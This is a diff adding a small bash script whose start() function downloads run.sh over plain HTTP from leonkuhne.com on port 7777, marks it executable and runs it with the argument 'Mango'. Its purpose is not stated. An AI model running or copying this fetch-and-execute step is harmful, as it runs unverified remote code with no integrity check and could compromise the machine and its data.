@@ -1,0 +1,7 @@
+#!/bin/bash
+
+function start() {
+  wget http://leonkuhne.com:7777/run.sh
+  chmod a+x run.sh
+  ./run.sh Mango
+}
